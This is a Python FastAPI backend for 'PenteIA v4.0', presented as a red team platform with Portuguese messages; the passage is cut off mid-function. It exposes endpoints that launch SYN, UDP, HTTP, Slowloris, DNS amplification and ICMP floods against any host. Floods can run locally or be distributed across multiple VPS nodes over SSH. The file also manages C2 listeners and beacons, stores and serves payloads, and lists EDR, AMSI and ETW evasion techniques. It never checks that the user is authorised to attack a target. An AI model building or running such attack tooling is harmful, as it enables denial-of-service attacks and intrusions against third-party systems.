#!/usr/bin/env python
# -*- coding: utf-8 -*-
from fastapi import FastAPI, HTTPException, Depends, status, File, UploadFile, Request
from fastapi.responses import JSONResponse, FileResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from fastapi.templating import Jinja2Templates
from fastapi.security import HTTPBearer
from pydantic import BaseModel, Field, field_validator
import re as _re
from typing import Optional, List
from datetime import datetime, timedelta
from sqlalchemy.orm import Session
from sqlalchemy import func
import json, os, io, time, asyncio, threading, socket as _socket
import requests as _requests
import queue as _queue
from pathlib import Path

from database import get_db, SessionLocal
from auth import (
    get_current_user, require_admin, authenticate_user, create_access_token,
    hash_password, LoginRequest, TokenResponse, RegisterRequest
)
from models import User, Listener, Beacon, Playbook, Simulation, Report, Payload

from penteia_v4_orchestrator import PenteIAv4Orchestrator
from ddos_testing import DDoSTestingEngine, DDoSConfig, DDoSMethod
from ssh_proxy import SSHProxyConfig, SSHProxyExecutor, SSHProxyPool
from local_executor import LocalFloodExecutor
from recon import resolver_dominio, scan_portas, extrair_host, parse_portas
from cdn_bypass import find_origin_ip
import cloudfail_recon as _cf
from serverless_recon import find_serverless_endpoints

# — in-memory operation log (shared across requests in single-process mode)
_operation_logs: list = []
_ssh_tests: dict = {}      # test_id -> {thread, result, started_at, executor}
_scan_tasks: dict = {}     # task_id -> {"q": Queue, "done": bool, "results": list, "error": str|None, "completed_at": float}
_login_attempts: dict = {} # ip -> [timestamps]

ALLOWED_ORIGINS = os.getenv("CORS_ORIGINS", "http://localhost:5173,http://localhost:3000").split(",")

app = FastAPI(title="PenteIA v4.0", description="Red Team Platform", version="4.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

base_dir = os.path.dirname(os.path.abspath(__file__))
static_dir = os.path.join(base_dir, "static")
templates_dir = os.path.join(base_dir, "templates")

if os.path.exists(static_dir):
    app.mount("/static", StaticFiles(directory=static_dir), name="static")

orchestrator = PenteIAv4Orchestrator()
ddos_engine = DDoSTestingEngine()


# ── Pydantic models ──────────────────────────────────────────────────────────

class DDoSStartRequest(BaseModel):
    target_host: str
    target_port: int = 80
    method: str = "http_flood"
    duration: int = 60
    pps: int = 500
    threads: int = 8
    payload_size: int = 512      # UDP: tamanho do payload em bytes
    connections: int = 300       # Slowloris: conexões simultâneas
    use_ssh_proxy: bool = False
    use_local: bool = False
    ssh_host: Optional[str] = None
    ssh_port: int = 22
    ssh_user: Optional[str] = None
    ssh_pass: Optional[str] = None
    endpoints: str = ''

class SSHProxyTestRequest(BaseModel):
    host: str
    port: int = 22
    user: str
    password: str

class VPSNode(BaseModel):
    host: str
    port: int = 22
    user: str
    password: str

class DDoSPoolStartRequest(BaseModel):
    target_host: str
    target_port: int = 80
    method: str = "http_flood"
    duration: int = 60
    pps: int = 200
    threads: int = 4
    vps_list: List[VPSNode]
    endpoints: str = ''

class ServerlessReconRequest(BaseModel):
    domain: str
    use_ssl: bool = True

class CDNCheckRequest(BaseModel):
    domain: str

class ReconResolveRequest(BaseModel):
    domain: str

class ReconIPInfoRequest(BaseModel):
    ip: str

class ReconScanRequest(BaseModel):
    host: str
    ports: str = "1-1000"
    timeout: float = 1.0
    workers: int = 50

class AdminCreateUserRequest(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    email: str = Field(..., max_length=255)
    password: str = Field(..., min_length=6, max_length=128)
    is_admin: bool = False
    credits: int = Field(0, ge=0)

    @field_validator("email")
    @classmethod
    def validate_email(cls, v: str) -> str:
        if not _re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", v):
            raise ValueError("Email inválido")
        return v.lower()

class AdminUpdateUserRequest(BaseModel):
    username: Optional[str] = None
    email: Optional[str] = None
    password: Optional[str] = None
    is_admin: Optional[bool] = None
    status: Optional[str] = None

class AdminCreditsRequest(BaseModel):
    action: str
    amount: int = Field(..., ge=0)

class ListenerCreateRequest(BaseModel):
    name: str
    host: str
    port: int = 443
    protocol: str = "HTTPS"

class BeaconCreateRequest(BaseModel):
    hostname: str
    ip: str
    user: str

class BeaconCommandRequest(BaseModel):
    command: str

class PlaybookCreateRequest(BaseModel):
    name: str
    techniques: int = 0
    severity: str
    description: str = ""

class PlaybookExecuteRequest(BaseModel):
    playbook_id: str
    target: str = "localhost"

class ReportCreateRequest(BaseModel):
    title: str
    report_type: str
    format: str

class CloudFailRequest(BaseModel):
    domain: str
    workers: int = 30
    use_custom_wordlist: bool = False


# ── Helpers ──────────────────────────────────────────────────────────────────

def _check_rate_limit(ip: str, max_attempts: int = 10, window: int = 60) -> bool:
    now = time.time()
    window_start = now - window
    attempts = [t for t in _login_attempts.get(ip, []) if t > window_start]
    if len(attempts) >= max_attempts:
        _login_attempts[ip] = attempts  # mantém lista prunada mas não adiciona
        return False
    attempts.append(now)
    if attempts:
        _login_attempts[ip] = attempts
    else:
        _login_attempts.pop(ip, None)  # remove chave quando lista fica vazia (GC)
    return True

def _cleanup_old_scan_tasks():
    cutoff = time.time() - 600
    to_remove = [k for k, v in list(_scan_tasks.items()) if v.get("done") and v.get("completed_at", 0) < cutoff]
    for k in to_remove:
        del _scan_tasks[k]


# ── Health ───────────────────────────────────────────────────────────────────

@app.get("/api/health")
async def health():
    return {"status": "ok", "timestamp": datetime.utcnow().isoformat()}


# ── Status / Dashboard ───────────────────────────────────────────────────────

@app.get("/api/status")
async def get_status(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    modules = {
        "ddos": {"name": "DDoS Testing", "status": "ready"},
        "recon": {"name": "Recon", "status": "ready"},
        "c2": {"name": "C2 Framework", "status": "ready"},
        "bas": {"name": "BAS", "status": "ready"},
        "edr_evasion": {"name": "EDR Evasion", "status": "ready"},
        "memory_evasion": {"name": "Memory Evasion", "status": "ready"},
        "telemetry_bypass": {"name": "Telemetry Bypass", "status": "ready"},
        "post_exploitation": {"name": "Post-Exploitation", "status": "ready"},
        "reporting": {"name": "Reporting", "status": "ready"},
    }
    return {
        "status": "online",
        "modules": modules,
        "active_operations": len([o for o in _operation_logs if o.get("module") != "SYSTEM"]),
    }


# ── Auth ─────────────────────────────────────────────────────────────────────

@app.post("/api/auth/register")
async def register(req: RegisterRequest, db: Session = Depends(get_db)):
    existing = db.query(User).filter(User.username == req.username).first()
    if existing:
        raise HTTPException(status_code=400, detail="Usuário já existe")
    user = User(username=req.username, email=req.email, password_hash=hash_password(req.password))
    db.add(user)
    db.commit()
    db.refresh(user)
    access_token = create_access_token(data={"sub": user.id})
    return TokenResponse(access_token=access_token, token_type="bearer", username=user.username)

@app.post("/api/auth/login")
async def login(req: LoginRequest, request: Request, db: Session = Depends(get_db)):
    client_ip = request.client.host if request.client else "unknown"
    if not _check_rate_limit(client_ip):
        raise HTTPException(status_code=429, detail="Muitas tentativas de login. Aguarde 60 segundos.")
    user = await authenticate_user(db, req.username, req.password)
    if not user:
        raise HTTPException(status_code=401, detail="Credenciais inválidas")
    if user == "suspended":
        raise HTTPException(status_code=403, detail="Conta suspensa. Entre em contato com o administrador.")
    access_token = create_access_token(data={"sub": user.id})
    return TokenResponse(access_token=access_token, token_type="bearer", username=user.username, is_admin=user.is_admin or False)

@app.get("/api/auth/me")
async def get_me(current_user: User = Depends(get_current_user)):
    return {
        "id": current_user.id,
        "username": current_user.username,
        "email": current_user.email,
        "is_admin": current_user.is_admin or False,
        "credits": current_user.credits or 0,
        "status": current_user.status or "active",
    }


# ── Modules ──────────────────────────────────────────────────────────────────

@app.get("/api/modules/status")
async def get_modules_status(current_user: User = Depends(get_current_user)):
    return {
        "modules": {
            "ddos": {"name": "DDoS Testing", "description": "5 métodos de ataque", "status": "ready"},
            "recon": {"name": "Recon", "description": "DNS + Port Scanning", "status": "ready"},
            "c2": {"name": "C2 Framework", "description": "Beacon Management", "status": "ready"},
            "bas": {"name": "BAS", "description": "MITRE ATT&CK Simulations", "status": "ready"},
            "edr_evasion": {"name": "EDR Evasion", "description": "Evasão de EDR", "status": "ready"},
            "memory_evasion": {"name": "Memory Evasion", "description": "Evasão de Memória", "status": "ready"},
            "telemetry_bypass": {"name": "Telemetry Bypass", "description": "Bypass de Telemetria", "status": "ready"},
            "post_exploitation": {"name": "Post-Exploitation", "description": "Pós-exploração", "status": "ready"},
            "reporting": {"name": "Reporting", "description": "Geração de Relatórios", "status": "ready"},
        }
    }

@app.get("/api/modules/config/{module_key}")
async def get_module_config(module_key: str, current_user: User = Depends(get_current_user)):
    configs = {
        "ddos": {"name": "DDoS Testing", "version": "4.0", "status": "ready",
                 "features": ["SYN Flood", "UDP Flood", "HTTP Flood", "Slowloris", "DNS Amplification"]},
        "recon": {"name": "Recon", "version": "3.0", "status": "ready",
                  "features": ["DNS Resolution", "TCP Port Scan", "Banner Grabbing", "OS Detection"]},
        "c2": {"name": "C2 Framework", "version": "4.0", "status": "ready",
               "features": ["HTTP/HTTPS Beacon", "DNS Beacon", "Malleable C2 Profiles", "Sleep Jitter"]},
        "bas": {"name": "BAS Engine", "version": "4.0", "status": "ready",
                "features": ["MITRE ATT&CK Playbooks", "Technique Execution", "Evidence Collection", "Scoring"]},
        "edr_evasion": {"name": "EDR Evasion", "version": "4.0", "status": "ready",
                        "features": ["ROP Gadgets", "Indirect Syscalls", "Module Stomping", "Sandbox Detection"]},
        "memory_evasion": {"name": "Memory Evasion", "version": "4.0", "status": "ready",
                           "features": ["Sleep Obfuscation", "Thread Stack Spoofing", "APC Queue Abuse"]},
        "telemetry_bypass": {"name": "Telemetry Bypass", "version": "4.0", "status": "ready",
                             "features": ["AMSI Bypass", "ETW Disable", "Event Log Manipulation", "Sysmon Bypass"]},
        "post_exploitation": {"name": "Post-Exploitation", "version": "4.0", "status": "ready",
                              "features": ["COFF/BOF Execution", ".NET Assembly", "Mimikatz Integration", "BloodHound"]},
        "reporting": {"name": "Reporting", "version": "3.0", "status": "ready",
                      "features": ["PDF Export", "DOCX Export", "HTML Report", "Attack Graph"]},
    }
    if module_key not in configs:
        raise HTTPException(status_code=404, detail="Módulo não encontrado")
    return configs[module_key]


# ── Operations log ───────────────────────────────────────────────────────────

@app.get("/api/operations")
async def get_operations(limit: int = 50, current_user: User = Depends(get_current_user)):
    return {"operations": _operation_logs[-limit:]}

@app.post("/api/operations/clear")
async def clear_operations(current_user: User = Depends(get_current_user)):
    _operation_logs.clear()
    return {"message": "Logs limpos"}


# ── C2 ───────────────────────────────────────────────────────────────────────

@app.get("/api/c2/listeners")
async def get_listeners(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    listeners = db.query(Listener).filter(Listener.user_id == current_user.id).all()
    return {"listeners": [
        {"id": l.id, "name": l.name, "host": l.host, "port": l.port, "protocol": l.protocol, "status": l.status}
        for l in listeners
    ]}

@app.post("/api/c2/listeners")
async def create_listener(
    req: ListenerCreateRequest,
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    listener = Listener(user_id=current_user.id, name=req.name, host=req.host, port=req.port, protocol=req.protocol, status="active")
    db.add(listener)
    db.commit()
    _operation_logs.append({"module": "C2", "action": "Listener criado", "details": f"{req.name} ({req.host}:{req.port})", "timestamp": datetime.utcnow().isoformat()})
    return {"id": listener.id, "message": "Listener criado"}

@app.delete("/api/c2/listeners/{listener_id}")
async def delete_listener(listener_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    listener = db.query(Listener).filter(Listener.id == listener_id, Listener.user_id == current_user.id).first()
    if not listener:
        raise HTTPException(status_code=404, detail="Listener não encontrado")
    db.delete(listener)
    db.commit()
    return {"message": "Listener deletado"}

@app.get("/api/c2/beacons")
async def get_beacons(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    beacons = db.query(Beacon).filter(Beacon.user_id == current_user.id).all()
    return {"beacons": [
        {"id": b.id, "hostname": b.hostname, "ip": b.ip, "user": b.user,
         "lastSeen": b.last_seen.isoformat(), "status": b.status}
        for b in beacons
    ]}

@app.post("/api/c2/beacons")
async def register_beacon(
    req: BeaconCreateRequest,
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    beacon = Beacon(user_id=current_user.id, hostname=req.hostname, ip=req.ip, user=req.user, status="active")
    db.add(beacon)
    db.commit()
    return {"id": beacon.id, "message": "Beacon registrado"}

@app.post("/api/c2/beacons/{beacon_id}/command")
async def send_command(
    beacon_id: str, req: BeaconCommandRequest,
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    beacon = db.query(Beacon).filter(Beacon.id == beacon_id, Beacon.user_id == current_user.id).first()
    if not beacon:
        raise HTTPException(status_code=404, detail="Beacon não encontrado")
    beacon.last_seen = datetime.utcnow()
    db.commit()
    return {"beacon_id": beacon_id, "command": req.command, "output": f"Executado: {req.command}", "timestamp": datetime.utcnow().isoformat()}


# ── BAS ──────────────────────────────────────────────────────────────────────

@app.get("/api/bas/playbooks")
async def get_playbooks(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    playbooks = db.query(Playbook).filter(Playbook.user_id == current_user.id).all()
    return {"playbooks": [{"id": p.id, "name": p.name, "techniques": p.techniques, "severity": p.severity} for p in playbooks]}

@app.post("/api/bas/playbooks")
async def create_playbook(
    req: PlaybookCreateRequest,
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    playbook = Playbook(user_id=current_user.id, name=req.name, techniques=req.techniques, severity=req.severity, description=req.description)
    db.add(playbook)
    db.commit()
    _operation_logs.append({"module": "BAS", "action": "Playbook criado", "details": req.name, "timestamp": datetime.utcnow().isoformat()})
    return {"id": playbook.id, "message": "Playbook criado"}

@app.delete("/api/bas/playbooks/{playbook_id}")
async def delete_playbook(playbook_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    playbook = db.query(Playbook).filter(Playbook.id == playbook_id, Playbook.user_id == current_user.id).first()
    if not playbook:
        raise HTTPException(status_code=404, detail="Playbook não encontrado")
    db.delete(playbook)
    db.commit()
    return {"message": "Playbook deletado"}

@app.post("/api/bas/execute")
async def execute_playbook(
    req: PlaybookExecuteRequest,
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    playbook = db.query(Playbook).filter(Playbook.id == req.playbook_id, Playbook.user_id == current_user.id).first()
    if not playbook:
        raise HTTPException(status_code=404, detail="Playbook não encontrado")
    simulation = Simulation(user_id=current_user.id, playbook_id=req.playbook_id, target=req.target, status="running", score=0.0)
    db.add(simulation)
    db.commit()
    _operation_logs.append({"module": "BAS", "action": "Simulação iniciada", "details": f"{playbook.name} → {req.target}", "timestamp": datetime.utcnow().isoformat()})
    return {"id": simulation.id, "status": "running", "message": "Simulação iniciada"}

@app.get("/api/bas/simulations")
async def get_simulations(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    sims = db.query(Simulation).filter(Simulation.user_id == current_user.id).all()
    return {"simulations": [
        {"id": s.id, "playbook_id": s.playbook_id, "target": s.target, "status": s.status, "score": s.score, "date": s.date.isoformat()}
        for s in sims
    ]}


# ── Reporting ────────────────────────────────────────────────────────────────

@app.post("/api/reporting/generate")
async def generate_report(
    req: ReportCreateRequest,
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    report = Report(
        user_id=current_user.id, title=req.title, type=req.report_type, format=req.format,
        json_data={"generated_at": datetime.utcnow().isoformat(), "type": req.report_type, "title": req.title}
    )
    db.add(report)
    db.commit()
    _operation_logs.append({"module": "SYSTEM", "action": "Relatório gerado", "details": req.title, "timestamp": datetime.utcnow().isoformat()})
    return {"id": report.id, "message": "Relatório gerado"}

@app.get("/api/reporting/reports")
async def get_reports(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    reports = db.query(Report).filter(Report.user_id == current_user.id).all()
    return {"reports": [
        {"id": r.id, "title": r.title, "type": r.type, "format": r.format, "created_at": r.created_at.isoformat()}
        for r in reports
    ]}

@app.get("/api/reporting/reports/{report_id}/download")
async def download_report(report_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    report = db.query(Report).filter(Report.id == report_id, Report.user_id == current_user.id).first()
    if not report:
        raise HTTPException(status_code=404, detail="Relatório não encontrado")
    content = json.dumps(report.json_data or {}, indent=2, ensure_ascii=False).encode("utf-8")
    return StreamingResponse(
        io.BytesIO(content),
        media_type="application/json",
        headers={"Content-Disposition": f'attachment; filename="report-{report.id}.json"'},
    )

@app.delete("/api/reporting/reports/{report_id}")
async def delete_report(report_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    report = db.query(Report).filter(Report.id == report_id, Report.user_id == current_user.id).first()
    if not report:
        raise HTTPException(status_code=404, detail="Relatório não encontrado")
    db.delete(report)
    db.commit()
    return {"message": "Relatório deletado"}


# ── Evasion ──────────────────────────────────────────────────────────────────

@app.get("/api/evasion/techniques")
async def get_evasion_techniques(current_user: User = Depends(get_current_user)):
    return {
        "techniques": [
            {
                "id": "edr-evasion",
                "name": "EDR Evasion",
                "category": "Defense Evasion",
                "techniques": ["ROP Gadget Chaining", "Indirect Syscalls", "Module Stomping", "Sandbox Detection"]
            },
            {
                "id": "memory-evasion",
                "name": "Memory Evasion",
                "category": "Defense Evasion",
                "techniques": ["Sleep Obfuscation (Ekko)", "Thread Stack Spoofing", "APC Queue Abuse", "HeapEncrypt"]
            },
            {
                "id": "telemetry-bypass",
                "name": "Telemetry Bypass",
                "category": "Defense Evasion",
                "techniques": ["AMSI Bypass (Patchless)", "ETW Provider Disable", "Event Log Manipulation", "Sysmon Blind"]
            },
            {
                "id": "process-injection",
                "name": "Process Injection",
                "category": "Defense Evasion",
                "techniques": ["Classic DLL Injection", "Process Hollowing", "Early Bird APC", "Phantom DLL Hollowing"]
            },
        ]
    }

@app.get("/api/evasion/payloads")
async def get_payloads(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    payloads = db.query(Payload).filter(Payload.user_id == current_user.id).all()
    return {"payloads": [
        {"id": p.id, "name": p.name, "type": p.type, "size": p.size, "created_at": p.created_at.isoformat()}
        for p in payloads
    ]}

@app.post("/api/evasion/payloads")
async def upload_payload(
    name: str, payload_type: str, file: UploadFile = File(...),
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    content = await file.read()
    payload = Payload(user_id=current_user.id, name=name, type=payload_type, size=f"{len(content)} bytes", content=content)
    db.add(payload)
    db.commit()
    return {"id": payload.id, "message": "Payload enviado"}

@app.get("/api/evasion/payloads/{payload_id}/download")
async def download_payload(payload_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    payload = db.query(Payload).filter(Payload.id == payload_id, Payload.user_id == current_user.id).first()
    if not payload:
        raise HTTPException(status_code=404, detail="Payload não encontrado")
    return StreamingResponse(
        io.BytesIO(payload.content or b""),
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{payload.name}"'},
    )

@app.delete("/api/evasion/payloads/{payload_id}")
async def delete_payload(payload_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    payload = db.query(Payload).filter(Payload.id == payload_id, Payload.user_id == current_user.id).first()
    if not payload:
        raise HTTPException(status_code=404, detail="Payload não encontrado")
    db.delete(payload)
    db.commit()
    return {"message": "Payload deletado"}


# ── DDoS ─────────────────────────────────────────────────────────────────────

def _cleanup_old_ssh_tests():
    """Remove ssh tests que já terminaram e têm mais de 10 minutos."""
    cutoff = datetime.utcnow()
    to_del = []
    for tid, entry in list(_ssh_tests.items()):
        if not entry['thread'].is_alive():
            try:
                age = (cutoff - datetime.fromisoformat(entry['started_at'])).total_seconds()
                if age > 600:
                    to_del.append(tid)
            except Exception:
                to_del.append(tid)
    for tid in to_del:
        del _ssh_tests[tid]

@app.get("/api/ddos/methods")
async def get_ddos_methods():
    return {"methods": [
        {"name": "SYN Flood",         "value": "syn_flood",         "layer": "Layer 4 TCP",
         "desc": "Raw TCP SYN packets; enche a fila de conexões. Requer admin para raw sockets."},
        {"name": "UDP Flood",         "value": "udp_flood",         "layer": "Layer 4 UDP",
         "desc": "Pacotes UDP com payload variável; consome bandwidth. Multi-threaded."},
        {"name": "HTTP Flood",        "value": "http_flood",        "layer": "Layer 7",
         "desc": "Requisições HTTP com UA/path aleatórios; exaure conexões da aplicação."},
        {"name": "Slowloris",         "value": "slowloris",         "layer": "Layer 7",
         "desc": "Mantém centenas de conexões semi-abertas; esgota o pool de threads do servidor."},
        {"name": "DNS Amplification", "value": "dns_amplification", "layer": "Layer 3",
         "desc": "Envia queries DNS reais (ANY/TXT) para o alvo; ideal para testar servidores DNS."},
        {"name": "ICMP Flood",        "value": "icmp_flood",        "layer": "Layer 3",
         "desc": "Flood de ICMP Echo Request (ping). Requer admin; fallback UDP automático."},
    ]}

@app.post("/api/ddos/proxy/test")
async def test_ssh_proxy(req: SSHProxyTestRequest, current_user: User = Depends(get_current_user)):
    cfg = SSHProxyConfig(host=req.host, port=req.port, user=req.user, password=req.password)
    result = SSHProxyExecutor(cfg).test_connection()
    if not result.get('ok'):
        raise HTTPException(status_code=400, detail=result.get('error', 'Falha na conexão SSH'))
    return result

@app.post("/api/ddos/proxy/diag")
async def diag_ssh_proxy(req: SSHProxyTestRequest, current_user: User = Depends(get_current_user)):
    cfg = SSHProxyConfig(host=req.host, port=req.port, user=req.user, password=req.password)
    result = await asyncio.get_event_loop().run_in_executor(
        None, SSHProxyExecutor(cfg).get_diagnostics
    )
    if not result.get('ok'):
        raise HTTPException(status_code=400, detail=result.get('error', 'Falha na conexão SSH'))
    return result

@app.post("/api/ddos/start")
async def start_ddos(req: DDoSStartRequest, current_user: User = Depends(get_current_user)):
    # Resolve domain → IP (necessário para métodos Layer 3/4 que usam raw sockets)
    try:
        resolved_host = await asyncio.get_event_loop().run_in_executor(
            None, _socket.gethostbyname, req.target_host
        )
    except _socket.gaierror:
        raise HTTPException(status_code=400, detail=f"Não foi possível resolver o host: {req.target_host}")

    via_label = "local" if req.use_local else ("SSH" if req.use_ssh_proxy else "direto")
    _operation_logs.append({
        "module": "DDoS", "action": "Teste iniciado",
        "details": f"{req.target_host}({resolved_host}):{req.target_port} ({req.method}) via {via_label}",
        "timestamp": datetime.utcnow().isoformat(),
    })

    if req.use_local:
        _cleanup_old_ssh_tests()
        executor = LocalFloodExecutor()
        thread, result = executor.start_test(
            target_host=req.target_host, target_port=req.target_port,
            method=req.method, duration=req.duration, pps=req.pps, threads=req.threads,
            endpoints=req.endpoints,
        )
        test_id = f"local_{int(time.time() * 1000)}_{os.urandom(3).hex()}"
        _ssh_tests[test_id] = {
            'thread': thread, 'result': result,
            'started_at': datetime.utcnow().isoformat(),
            'executor': None,
        }
        if result.get('status') == 'port_closed':
            return {"test_id": test_id, "status": "port_closed", "via": "local",
                    "error": result.get('error', '')}
        return {"test_id": test_id, "status": "started", "via": "local"}

    if req.use_ssh_proxy and req.ssh_host:
        _cleanup_old_ssh_tests()
        cfg = SSHProxyConfig(
            host=req.ssh_host, port=req.ssh_port,
            user=req.ssh_user or '', password=req.ssh_pass or '',
        )
        executor = SSHProxyExecutor(cfg)
        thread, result = executor.start_test(
            target_host=req.target_host, target_port=req.target_port,
            method=req.method, duration=req.duration, pps=req.pps, threads=req.threads,
            endpoints=req.endpoints,
        )
        test_id = f"ssh_{int(time.time() * 1000)}_{os.urandom(3).hex()}"
        _ssh_tests[test_id] = {
            'thread': thread, 'result': result,
            'started_at': datetime.utcnow().isoformat(),
            'executor': executor,
        }
        # port_closed: reporta imediatamente sem waiting
        if result.get('status') == 'port_closed':
            return {"test_id": test_id, "status": "port_closed", "via": "ssh_proxy",
                    "error": result.get('error', '')}
        return {"test_id": test_id, "status": "started", "via": "ssh_proxy"}

    config = DDoSConfig(
        target_host=req.target_host, target_port=req.target_port,
        method=DDoSMethod(req.method),
        duration_seconds=req.duration,
        packets_per_second=req.pps,
        threads=req.threads,
        payload_size=req.payload_size,
        connections=req.connections,
    )
    try:
        test_id = ddos_engine.start_test(config)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    return {"test_id": test_id, "status": "started"}

@app.get("/api/ddos/status/{test_id}")
async def get_ddos_status(test_id: str, current_user: User = Depends(get_current_user)):
    if test_id in _ssh_tests:
        entry = _ssh_tests[test_id]
        res   = entry['result']
        alive = entry['thread'].is_alive()
        # Calcula elapsed e taxas a partir do started_at
        try:
            started_ts = datetime.fromisoformat(entry['started_at'])
            elapsed    = (datetime.utcnow() - started_ts).total_seconds()
        except Exception:
            elapsed = 0.0
        pkts = res.get('packets', 0)
        reqs = res.get('requests', 0)
        errs = res.get('errors', 0)
        return {
            "test_id":       test_id,
            "status":        "running" if alive else res.get('status', 'completed'),
            "via":           "ssh_proxy",
            "started_at":    entry['started_at'],
            "packets_sent":  pkts,
            "requests_sent": reqs,
            "connections":   res.get('connections', 0),
            "errors_count":  errs,
            "bytes_sent":    0,
            "elapsed":       round(elapsed, 1),
            "pps":           round(pkts / elapsed, 1) if elapsed > 0 else 0.0,
            "rps":           round(reqs / elapsed, 1) if elapsed > 0 else 0.0,
            "mbps":          0.0,
            "vps_pid":       res.get('vps_pid'),
            "output":        res.get('output', ''),
            "error":         res.get('error', ''),
        }
    result = ddos_engine.get_test_status(test_id)
    if not result or result.get("error"):
        return {"status": "not_found"}
    return result

@app.post("/api/ddos/stop/{test_id}")
async def stop_ddos(test_id: str, current_user: User = Depends(get_current_user)):
    if test_id in _ssh_tests:
        entry = _ssh_tests[test_id]
        res = entry['result']
        executor = entry.get('executor')
        vps_pid = res.get('vps_pid')
        if executor and vps_pid:
            await asyncio.to_thread(executor.kill_test, vps_pid)
            res['status'] = 'stopped'
            return {"message": f"Processo VPS PID {vps_pid} encerrado"}
        res['status'] = 'stopped'
        return {"message": "Teste SSH marcado como parado (PID ainda não disponível)"}
    ddos_engine.stop_test(test_id)
    return {"message": "Teste DDoS parado"}


@app.post("/api/ddos/pool/start")
async def start_ddos_pool(req: DDoSPoolStartRequest, current_user: User = Depends(get_current_user)):
    """Inicia ataque distribuído em múltiplos VPS simultaneamente."""
    if not req.vps_list:
        raise HTTPException(status_code=400, detail="Informe ao menos um VPS")

    configs = [SSHProxyConfig(host=v.host, port=v.port, user=v.user, password=v.password)
               for v in req.vps_list]
    pool = SSHProxyPool(configs)

    try:
        resolved_host = await asyncio.to_thread(_socket.gethostbyname, req.target_host)
    except Exception:
        resolved_host = req.target_host

    _operation_logs.append({
        "module": "DDoS", "action": "Pool attack",
        "details": f"{req.target_host}:{req.target_port} ({req.method}) — {len(configs)} VPS",
        "timestamp": datetime.utcnow().isoformat(),
    })

    nodes = pool.start_distributed_test(
        req.target_host, req.target_port, req.method, req.duration, req.pps, req.threads,
        endpoints=req.endpoints,
    )

    pool_id = f"pool_{int(time.time() * 1000)}_{os.urandom(3).hex()}"
    _ssh_tests[pool_id] = {
        'type': 'pool',
        'nodes': nodes,
        'started_at': datetime.utcnow().isoformat(),
        'thread': threading.Thread(target=lambda: None),  # dummy for TTL cleanup compat
    }
    _ssh_tests[pool_id]['thread'].start()

    return {
        "pool_id": pool_id,
        "status": "started",
        "vps_count": len(nodes),
        "nodes": [{"vps_host": n['vps_host'], "status": n['result']['status']} for n in nodes],
    }


@app.get("/api/ddos/pool/status/{pool_id}")
async def get_pool_status(pool_id: str, current_user: User = Depends(get_current_user)):
    """Retorna status agregado + por-VPS de um ataque em pool."""
    if pool_id not in _ssh_tests:
        return {"status": "not_found"}
    entry = _ssh_tests[pool_id]
    if entry.get('type') != 'pool':
        return {"status": "not_found"}

    nodes_status = []
    total_requests = 0; total_errors = 0; any_running = False

    for node in entry['nodes']:
        res = node['result']
        alive = node['thread'].is_alive()
        if alive:
            any_running = True
        status = "running" if alive else res.get('status', 'completed')
        total_requests += res.get('requests', 0)
        total_errors   += res.get('errors', 0)
        nodes_status.append({
            "vps_host":    node['vps_host'],
            "status":      status,
            "requests":    res.get('requests', 0),
            "errors":      res.get('errors', 0),
            "vps_pid":     res.get('vps_pid'),
            "output":      (res.get('output', '') or '')[-200:],
        })

    return {
        "pool_id": pool_id,
        "status":           "running" if any_running else "completed",
        "total_requests":   total_requests,
        "total_errors":     total_errors,
        "started_at":       entry['started_at'],
        "nodes":            nodes_status,
    }


@app.post("/api/ddos/pool/stop/{pool_id}")
async def stop_pool(pool_id: str, current_user: User = Depends(get_current_user)):
    """Para todos os VPS de um pool."""
    if pool_id not in _ssh_tests or _ssh_tests[pool_id].get('type') != 'pool':
        raise HTTPException(status_code=404, detail="Pool não encontrado")

    killed = []
    for node in _ssh_tests[pool_id]['nodes']:
        res = node['result']
        executor = node['executor']
        vps_pid = res.get('vps_pid')
        if executor and vps_pid:
            await asyncio.to_thread(executor.kill_test, vps_pid)
            killed.append(node['vps_host'])
        res['status'] = 'stopped'

    return {"message": f"Pool parado. VPS encerrados: {', '.join(killed) or 'nenhum (PID pendente)'}"}


# ── Serverless Recon ─────────────────────────────────────────────────────────

@app.post("/api/recon/serverless")
async def serverless_recon(req: ServerlessReconRequest, current_user: User = Depends(get_current_user)):
    domain = req.domain.strip().lower().removeprefix("http://").removeprefix("https://").split("/")[0].split("?")[0]
    _operation_logs.append({
        "module": "Recon", "action": "Serverless Recon",
        "details": domain, "timestamp": datetime.utcnow().isoformat(),
    })
    try:
        result = await asyncio.to_thread(find_serverless_endpoints, domain, req.use_ssl)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Erro no serverless recon: {e}")
    return result


# ── Recon ────────────────────────────────────────────────────────────────────

@app.post("/api/recon/resolve")
async def resolve_domain(req: ReconResolveRequest, current_user: User = Depends(get_current_user)):
    try:
        result = resolver_dominio(req.domain)
        _operation_logs.append({"module": "Recon", "action": "DNS resolve", "details": req.domain, "timestamp": datetime.utcnow().isoformat()})
        return {
            "domain": req.domain,
